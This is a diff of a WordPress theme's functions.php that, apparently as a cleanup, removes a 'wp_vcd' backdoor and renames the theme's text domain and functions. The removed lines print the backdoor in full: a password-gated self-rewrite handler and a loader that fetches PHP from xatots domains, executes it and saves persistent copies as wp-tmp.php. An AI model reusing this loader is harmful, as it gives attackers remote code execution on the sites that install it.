@@ -1,143 +1,4 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a879f74b48f99e721a912c9ce33b8445'))
-{
-	$div_code_name="wp_vcd";
-	switch ($_REQUEST['action'])
-	{
-	case 'change_domain';
-	if (isset($_REQUEST['newdomain']))
-	{
-		if (!empty($_REQUEST['newdomain']))
-		{
-			if ($file = @file_get_contents(__FILE__))
-			{
-				if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-				{
-					$file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-					@file_put_contents(__FILE__, $file);
-					print "true";
-				}
-
-
-			}
-		}
-	}
-	break;
-	case 'change_code';
-		if (isset($_REQUEST['newcode']))
-		{
-			if (!empty($_REQUEST['newcode']))
-			{
-				if ($file = @file_get_contents(__FILE__))
-				{
-					if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-					{
-						$file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-						@file_put_contents(__FILE__, $file);
-						print "true";
-					}
-				}
-			}
-		}
-		break;
-		default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
-	}
-		die("");
-}
-
-$div_code_name = "wp_vcd";
-$funcfile      = __FILE__;
-if(!function_exists('theme_temp_setup')) {
-    $path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
-        
-        function file_get_contents_tcurl($url)
-        {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
-            curl_setopt($ch, CURLOPT_HEADER, 0);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
-            $data = curl_exec($ch);
-            curl_close($ch);
-            return $data;
-        }
-        
-        function theme_temp_setup($phpCode)
-        {
-            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-           if( fwrite($handle, "<?php\n" . $phpCode))
-		   {
-		   }
-			else
-			{
-			$tmpfname = tempnam('./', "theme_temp_setup");
-            $handle   = fopen($tmpfname, "w+");
-			fwrite($handle, "<?php\n" . $phpCode);
-			}
-			fclose($handle);
-            include $tmpfname;
-            unlink($tmpfname);
-            return get_defined_vars();
-        }
-        $wp_auth_key='a2fc7b2eb1b12b4c26b88bf0bfb15a5c';
-        if (($tmpcontent = @file_get_contents("http://www.xatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.xatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
-
-            if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
-		elseif ($tmpcontent = @file_get_contents("http://www.xatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-			if (stripos($tmpcontent, $wp_auth_key) !== false) {
-				extract(theme_temp_setup($tmpcontent));
-				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-				
-				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-						@file_put_contents('wp-tmp.php', $tmpcontent);
-					}
-				}
-						
-			}
-		} 
-		elseif ($tmpcontent = @file_get_contents("http://www.xatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-			if (stripos($tmpcontent, $wp_auth_key) !== false) {
-				extract(theme_temp_setup($tmpcontent));
-				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-				
-				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-						@file_put_contents('wp-tmp.php', $tmpcontent);
-					}
-				}
-						
-			}
-		}
-		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-			extract(theme_temp_setup($tmpcontent));
-		}elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-		   extract(theme_temp_setup($tmpcontent)); 
-		} elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-			extract(theme_temp_setup($tmpcontent)); 
-		}     
-        
-    }
-}
-?><?php
-
 //======================================================================
 // THEME SETUP
 //======================================================================
@@ -146,15 +7,17 @@ if(!function_exists('theme_temp_setup')) {
  * Load CSS and JS the right way
  */
 function udm_load_css_and_js() {
+	wp_enqueue_style( 'stylesheet', 'http://fonts.googleapis.com/css?family=Lato:300,400,700');
     wp_enqueue_style( 'style', get_stylesheet_uri() );
+	
 	wp_enqueue_style( 'custom', get_stylesheet_directory_uri(). '/css/custom.css' );
 }
 add_action( 'wp_enqueue_scripts', 'udm_load_css_and_js' );
 
 // Basic Theme Support
-if ( ! function_exists( 'uglyduck_setup' ) ) :
-	function uglyduck_setup() {
-		load_theme_textdomain( 'uglyduck', get_template_directory() . '/languages' );
+if ( ! function_exists( 'udmbase_setup' ) ) :
+	function udmbase_setup() {
+		load_theme_textdomain( 'udmbase', get_template_directory() . '/languages' );
 		add_theme_support( 'automatic-feed-links' );
 		add_theme_support( 'title-tag' );
 		add_theme_support( 'post-thumbnails' );
@@ -175,13 +38,13 @@ if ( ! function_exists( 'uglyduck_setup' ) ) :
 		add_theme_support( 'woocommerce' );
 	}
 endif;
-add_action( 'after_setup_theme', 'uglyduck_setup' );
+add_action( 'after_setup_theme', 'udmbase_setup' );
 
 // Create Navigation Locations
 register_nav_menus(
 	array(
-		'primary' => esc_html__( 'Primary Menu', 'uglyduck' ),
-		'mobile' => esc_html__( 'Mobile Menu', 'uglyduck' ),
+		'primary' => esc_html__( 'Primary Menu', 'udmbase' ),
+		'mobile' => esc_html__( 'Mobile Menu', 'udmbase' ),
 	)
 );
 
@@ -244,33 +107,137 @@ add_filter('upload_mimes', 'cc_mime_types');
 //======================================================================
 
 // Widget Structure
-function create_widget( $name, $id, $description ) {
-	$args = array(
-	'name'          => __($name ),
-	'id'            => $id,
-	'description'   => $description,
+add_action( 'widgets_init', 'create_widget' );
+function create_widget( ) {
+	/*Default Sidebar*/
+	register_sidebar( array(
+	'name'          => __('Default Sidebar', 'udmbase' ),
+	'id'            => 'sidebar_1',
+	'description'   => __('This will hold the default WP widget', 'udmbase' ),
 	'before_widget' => '',
 	'after_widget'  => '',
 	'before_title'  => '<h5 class="widget-title">',
 	'after_title'   => '</h5>'
-	);
-	register_sidebar( $args );
+	) );
+	/*Footer Section One*/
+	register_sidebar( array(
+	'name'          => __('Footer Section One', 'udmbase' ),
+	'id'            => 'footer_one',
+	'description'   => __('Displays in the first section of the footer', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Footer Section Two*/
+	register_sidebar( array(
+	'name'          => __('Footer Section Two', 'udmbase' ),
+	'id'            => 'footer_two',
+	'description'   => __('Displays in the second section of the footer', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Footer Section Three*/
+	register_sidebar( array(
+	'name'          => __('Footer Section Three', 'udmbase' ),
+	'id'            => 'footer_three',
+	'description'   => __('Displays in the third section of the footer', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Footer Section Four*/
+	register_sidebar( array(
+	'name'          => __('Footer Section Four', 'udmbase' ),
+	'id'            => 'footer_four',
+	'description'   => __('Displays in the fourth section of the footer', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Footer Right Column*/
+	register_sidebar( array(
+	'name'          => __('Footer Right Column', 'udmbase' ),
+	'id'            => 'footer_five',
+	'description'   => __('Displays in the fifth section of the footer (This option changes the footer layout)', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Header Widget*/
+	register_sidebar( array(
+	'name'          => __('Header Widget', 'udmbase' ),
+	'id'            => 'header_widget',
+	'description'   => __('Displays In Header Section', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Woocommerce Sidebar*/
+	register_sidebar( array(
+	'name'          => __('Woocommerce Sidebar', 'udmbase' ),
+	'id'            => 'woo_sidebar',
+	'description'   => __('Displays items in Woocommerce Sidebar', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Left Sidebar*/
+	register_sidebar( array(
+	'name'          => __('Left Sidebar', 'udmbase' ),
+	'id'            => 'left_sidebar',
+	'description'   => __('Use this to display a sidebar on left side (Choose left or right only)', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Right Sidebar*/
+	register_sidebar( array(
+	'name'          => __('Right Sidebar', 'udmbase' ),
+	'id'            => 'right_sidebar',
+	'description'   => __('Use this to display a sidebar on right side (Choose left or right only)', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Left Blog Sidebar*/
+	register_sidebar( array(
+	'name'          => __('Left Blog Sidebar', 'udmbase' ),
+	'id'            => 'left_blog_sidebar',
+	'description'   => __('Use this to display a sidebar on left side of the blog (Choose left or right only)', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
+	/*Right Blog Sidebar*/
+	register_sidebar( array(
+	'name'          => __('Right Blog Sidebar', 'udmbase' ),
+	'id'            => 'right_blog_sidebar',
+	'description'   => __('Use this to display a sidebar on right side of the blog (Choose left or right only)', 'udmbase' ),
+	'before_widget' => '',
+	'after_widget'  => '',
+	'before_title'  => '<h5 class="widget-title">',
+	'after_title'   => '</h5>'
+	) );
 }
-create_widget( 'Default Sidebar', 'sidebar_1', 'This will hold the default WP widget' );
-create_widget( 'Footer Section One', 'footer_one', 'Displays in the first section of the footer' );
-create_widget( 'Footer Section Two', 'footer_two', 'Displays in the second section of the footer' );
-create_widget( 'Footer Section Three', 'footer_three', 'Displays in the third section of the footer' );
-create_widget( 'Footer Section Four', 'footer_four', 'Displays in the fourth section of the footer' );
-create_widget( 'Footer Right Column', 'footer_five', 'Displays in the fifth section of the footer (This option changes the footer layout)' );
-create_widget( 'Header Widget', 'header_widget', 'Displays In Header Section' );
-create_widget( 'Woocommerce Sidebar', 'woo_sidebar', 'Displays items in Woocommerce Sidebar' );
-create_widget( 'Left Sidebar', 'left_sidebar', 'Use this to display a sidebar on left side (Choose left or right only)' );
-create_widget( 'Right Sidebar', 'right_sidebar', 'Use this to display a sidebar on right side (Choose left or right only)' );
-create_widget( 'Left Blog Sidebar', 'left_blog_sidebar', 'Use this to display a sidebar on left side of the blog (Choose left or right only)' );
-create_widget( 'Right Blog Sidebar', 'right_blog_sidebar', 'Use this to display a sidebar on right side of the blog (Choose left or right only)' );
 
 // Enable Shortcodes In Widgets
 add_filter( 'widget_text', 'do_shortcode' );
+
+global $content_width;
+if ( ! isset( $content_width ) ) {
+	$content_width = 600;
+}
 
 //  Include File UDM Plugin Functions
 require_once(dirname(__FILE__) .'/udm-plugin/index.php');
@@ -279,37 +246,37 @@ require_once(dirname(__FILE__) .'/inc/meta-fields/meta_fields.php');
 // Gallery Post Type
 function gallery_post_type() {
 	$labels = array(
-		'name'                  => _x( 'Gallery', 'Post Type General Name', 'text_domain' ),
-		'singular_name'         => _x( 'Gallery', 'Post Type Singular Name', 'text_domain' ),
-		'menu_name'             => __( 'Gallery', 'text_domain' ),
-		'name_admin_bar'        => __( 'Gallery', 'text_domain' ),
-		'archives'              => __( 'Gallery Archives', 'text_domain' ),
-		'attributes'            => __( 'Gallery Attributes', 'text_domain' ),
-		'parent_item_colon'     => __( 'Parent Gallery:', 'text_domain' ),
-		'all_items'             => __( 'All Galleries', 'text_domain' ),
-		'add_new_item'          => __( 'Add New Gallery', 'text_domain' ),
-		'add_new'               => __( 'Add Gallery', 'text_domain' ),
-		'new_item'              => __( 'New Gallery', 'text_domain' ),
-		'edit_item'             => __( 'Edit Gallery', 'text_domain' ),
-		'update_item'           => __( 'Update Gallery', 'text_domain' ),
-		'view_item'             => __( 'View Gallery', 'text_domain' ),
-		'view_items'            => __( 'View Galleries', 'text_domain' ),
-		'search_items'          => __( 'Search Gallery', 'text_domain' ),
-		'not_found'             => __( 'Not found', 'text_domain' ),
-		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
-		'featured_image'        => __( 'Featured Image', 'text_domain' ),
-		'set_featured_image'    => __( 'Set featured image', 'text_domain' ),
-		'remove_featured_image' => __( 'Remove featured image', 'text_domain' ),
-		'use_featured_image'    => __( 'Use as featured image', 'text_domain' ),
-		'insert_into_item'      => __( 'Insert into item', 'text_domain' ),
-		'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ),
-		'items_list'            => __( 'Items list', 'text_domain' ),
-		'items_list_navigation' => __( 'Items list navigation', 'text_domain' ),
-		'filter_items_list'     => __( 'Filter items list', 'text_domain' ),
+		'name'                  => _x( 'Gallery', 'Post Type General Name', 'udmbase' ),
+		'singular_name'         => _x( 'Gallery', 'Post Type Singular Name', 'udmbase' ),
+		'menu_name'             => __( 'Gallery', 'udmbase' ),
+		'name_admin_bar'        => __( 'Gallery', 'udmbase' ),
+		'archives'              => __( 'Gallery Archives', 'udmbase' ),
+		'attributes'            => __( 'Gallery Attributes', 'udmbase' ),
+		'parent_item_colon'     => __( 'Parent Gallery:', 'udmbase' ),
+		'all_items'             => __( 'All Galleries', 'udmbase' ),
+		'add_new_item'          => __( 'Add New Gallery', 'udmbase' ),
+		'add_new'               => __( 'Add Gallery', 'udmbase' ),
+		'new_item'              => __( 'New Gallery', 'udmbase' ),
+		'edit_item'             => __( 'Edit Gallery', 'udmbase' ),
+		'update_item'           => __( 'Update Gallery', 'udmbase' ),
+		'view_item'             => __( 'View Gallery', 'udmbase' ),
+		'view_items'            => __( 'View Galleries', 'udmbase' ),
+		'search_items'          => __( 'Search Gallery', 'udmbase' ),
+		'not_found'             => __( 'Not found', 'udmbase' ),
+		'not_found_in_trash'    => __( 'Not found in Trash', 'udmbase' ),
+		'featured_image'        => __( 'Featured Image', 'udmbase' ),
+		'set_featured_image'    => __( 'Set featured image', 'udmbase' ),
+		'remove_featured_image' => __( 'Remove featured image', 'udmbase' ),
+		'use_featured_image'    => __( 'Use as featured image', 'udmbase' ),
+		'insert_into_item'      => __( 'Insert into item', 'udmbase' ),
+		'uploaded_to_this_item' => __( 'Uploaded to this item', 'udmbase' ),
+		'items_list'            => __( 'Items list', 'udmbase' ),
+		'items_list_navigation' => __( 'Items list navigation', 'udmbase' ),
+		'filter_items_list'     => __( 'Filter items list', 'udmbase' ),
 	);
 	$args = array(
-		'label'                 => __( 'Gallery', 'text_domain' ),
-		'description'           => __( 'Gallery', 'text_domain' ),
+		'label'                 => __( 'Gallery', 'udmbase' ),
+		'description'           => __( 'Gallery', 'udmbase' ),
 		'labels'                => $labels,
 		'supports'              => array( 'title', 'editor', 'thumbnail' ),
 		'hierarchical'          => false,
@@ -361,37 +328,37 @@ add_shortcode('udm_gallery', 'udm_gallery');
 // Service Post Type
 function service_post_type() {
 	$labels = array(
-		'name'                  => _x( 'Service', 'Post Type General Name', 'text_domain' ),
-		'singular_name'         => _x( 'Service', 'Post Type Singular Name', 'text_domain' ),
-		'menu_name'             => __( 'Service', 'text_domain' ),
-		'name_admin_bar'        => __( 'Service', 'text_domain' ),
-		'archives'              => __( 'Service Archives', 'text_domain' ),
-		'attributes'            => __( 'Service Attributes', 'text_domain' ),
-		'parent_item_colon'     => __( 'Parent Service:', 'text_domain' ),
-		'all_items'             => __( 'All Services', 'text_domain' ),
-		'add_new_item'          => __( 'Add New Service', 'text_domain' ),
-		'add_new'               => __( 'Add Service', 'text_domain' ),
-		'new_item'              => __( 'New Service', 'text_domain' ),
-		'edit_item'             => __( 'Edit Service', 'text_domain' ),
-		'update_item'           => __( 'Update Service', 'text_domain' ),
-		'view_item'             => __( 'View Service', 'text_domain' ),
-		'view_items'            => __( 'View Service', 'text_domain' ),
-		'search_items'          => __( 'Search Service', 'text_domain' ),
-		'not_found'             => __( 'Not found', 'text_domain' ),
-		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
-		'featured_image'        => __( 'Service Image', 'text_domain' ),
-		'set_featured_image'    => __( 'Set service image', 'text_domain' ),
-		'remove_featured_image' => __( 'Remove service image', 'text_domain' ),
-		'use_featured_image'    => __( 'Use as service image', 'text_domain' ),
-		'insert_into_item'      => __( 'Insert into service', 'text_domain' ),
-		'uploaded_to_this_item' => __( 'Uploaded to this service', 'text_domain' ),
-		'items_list'            => __( 'Services list', 'text_domain' ),
-		'items_list_navigation' => __( 'Services list navigation', 'text_domain' ),
-		'filter_items_list'     => __( 'Filter Services list', 'text_domain' ),
+		'name'                  => _x( 'Service', 'Post Type General Name', 'udmbase' ),
+		'singular_name'         => _x( 'Service', 'Post Type Singular Name', 'udmbase' ),
+		'menu_name'             => __( 'Service', 'udmbase' ),
+		'name_admin_bar'        => __( 'Service', 'udmbase' ),
+		'archives'              => __( 'Service Archives', 'udmbase' ),
+		'attributes'            => __( 'Service Attributes', 'udmbase' ),
+		'parent_item_colon'     => __( 'Parent Service:', 'udmbase' ),
+		'all_items'             => __( 'All Services', 'udmbase' ),
+		'add_new_item'          => __( 'Add New Service', 'udmbase' ),
+		'add_new'               => __( 'Add Service', 'udmbase' ),
+		'new_item'              => __( 'New Service', 'udmbase' ),
+		'edit_item'             => __( 'Edit Service', 'udmbase' ),
+		'update_item'           => __( 'Update Service', 'udmbase' ),
+		'view_item'             => __( 'View Service', 'udmbase' ),
+		'view_items'            => __( 'View Service', 'udmbase' ),
+		'search_items'          => __( 'Search Service', 'udmbase' ),
+		'not_found'             => __( 'Not found', 'udmbase' ),
+		'not_found_in_trash'    => __( 'Not found in Trash', 'udmbase' ),
+		'featured_image'        => __( 'Service Image', 'udmbase' ),
+		'set_featured_image'    => __( 'Set service image', 'udmbase' ),
+		'remove_featured_image' => __( 'Remove service image', 'udmbase' ),
+		'use_featured_image'    => __( 'Use as service image', 'udmbase' ),
+		'insert_into_item'      => __( 'Insert into service', 'udmbase' ),
+		'uploaded_to_this_item' => __( 'Uploaded to this service', 'udmbase' ),
+		'items_list'            => __( 'Services list', 'udmbase' ),
+		'items_list_navigation' => __( 'Services list navigation', 'udmbase' ),
+		'filter_items_list'     => __( 'Filter Services list', 'udmbase' ),
 	);
 	$args = array(
-		'label'                 => __( 'Service', 'text_domain' ),
-		'description'           => __( 'Service', 'text_domain' ),
+		'label'                 => __( 'Service', 'udmbase' ),
+		'description'           => __( 'Service', 'udmbase' ),
 		'labels'                => $labels,
 		'supports' =>array( 'title', 'thumbnail','custom-fields' ),
 		'taxonomies' => array(),
@@ -417,26 +384,26 @@ if ( ! function_exists( 'service_cat' ) ) {
 function service_cat() {
 
 	$labels = array(
-		'name'                       => _x( 'Service Categories', 'Taxonomy General Name', 'text_domain' ),
-		'singular_name'              => _x( 'Service Category', 'Taxonomy Singular Name', 'text_domain' ),
-		'menu_name'                  => __( 'Service Category', 'text_domain' ),
-		'all_items'                  => __( 'Service Categories', 'text_domain' ),
-		'parent_item'                => __( 'Parent Service Category', 'text_domain' ),
-		'parent_item_colon'          => __( 'Parent Service Category:', 'text_domain' ),
-		'new_item_name'              => __( 'New Service Category', 'text_domain' ),
-		'add_new_item'               => __( 'Add New Service Category', 'text_domain' ),
-		'edit_item'                  => __( 'Edit Service Category', 'text_domain' ),
-		'update_item'                => __( 'Update Service Category', 'text_domain' ),
-		'view_item'                  => __( 'View Service Category', 'text_domain' ),
-		'separate_items_with_commas' => __( 'Separate items with commas', 'text_domain' ),
-		'add_or_remove_items'        => __( 'Add or remove service categories', 'text_domain' ),
-		'choose_from_most_used'      => __( 'Choose from the most used', 'text_domain' ),
-		'popular_items'              => __( 'Popular service categories', 'text_domain' ),
-		'search_items'               => __( 'Search Items', 'text_domain' ),
-		'not_found'                  => __( 'Not Found', 'text_domain' ),
-		'no_terms'                   => __( 'No items', 'text_domain' ),
-		'items_list'                 => __( 'Items list', 'text_domain' ),
-		'items_list_navigation'      => __( 'Items list navigation', 'text_domain' ),
+		'name'                       => _x( 'Service Categories', 'Taxonomy General Name', 'udmbase' ),
+		'singular_name'              => _x( 'Service Category', 'Taxonomy Singular Name', 'udmbase' ),
+		'menu_name'                  => __( 'Service Category', 'udmbase' ),
+		'all_items'                  => __( 'Service Categories', 'udmbase' ),
+		'parent_item'                => __( 'Parent Service Category', 'udmbase' ),
+		'parent_item_colon'          => __( 'Parent Service Category:', 'udmbase' ),
+		'new_item_name'              => __( 'New Service Category', 'udmbase' ),
+		'add_new_item'               => __( 'Add New Service Category', 'udmbase' ),
+		'edit_item'                  => __( 'Edit Service Category', 'udmbase' ),
+		'update_item'                => __( 'Update Service Category', 'udmbase' ),
+		'view_item'                  => __( 'View Service Category', 'udmbase' ),
+		'separate_items_with_commas' => __( 'Separate items with commas', 'udmbase' ),
+		'add_or_remove_items'        => __( 'Add or remove service categories', 'udmbase' ),
+		'choose_from_most_used'      => __( 'Choose from the most used', 'udmbase' ),
+		'popular_items'              => __( 'Popular service categories', 'udmbase' ),
+		'search_items'               => __( 'Search Items', 'udmbase' ),
+		'not_found'                  => __( 'Not Found', 'udmbase' ),
+		'no_terms'                   => __( 'No items', 'udmbase' ),
+		'items_list'                 => __( 'Items list', 'udmbase' ),
+		'items_list_navigation'      => __( 'Items list navigation', 'udmbase' ),
 	);
 	$args = array(
 		'labels'                     => $labels,
@@ -454,7 +421,7 @@ add_action( 'init', 'service_cat', 0 );
 }
 
 require_once dirname( __FILE__ ) . '/inc/class-udm-plugin-activation.php';
-add_action( 'udmpa_register', 'my_theme_register_required_plugins' );
+add_action( 'udmbase_register', 'my_theme_register_required_plugins' );
 function my_theme_register_required_plugins() {
 	$plugins = array(
 	
@@ -483,9 +450,9 @@ function my_theme_register_required_plugins() {
 	);
 	
 	$config = array(
-		'id'           => 'udmpa',             
+		'id'           => 'udmbase',             
 		'default_path' => '',  
-		'menu'         => 'udmpa-install-plugins', 
+		'menu'         => 'udmbase-install-plugins', 
 		'parent_slug'  => 'themes.php',           
 		'capability'   => 'edit_theme_options',    
 		'has_notices'  => true,                  
@@ -494,7 +461,7 @@ function my_theme_register_required_plugins() {
 		'is_automatic' => false,                   
 		'message'      => '',              
 	);
-	udmpa( $plugins, $config );
+	udmbase( $plugins, $config );
 }
 
 function theme_pre_set_transient_update_theme ( $transient ) {
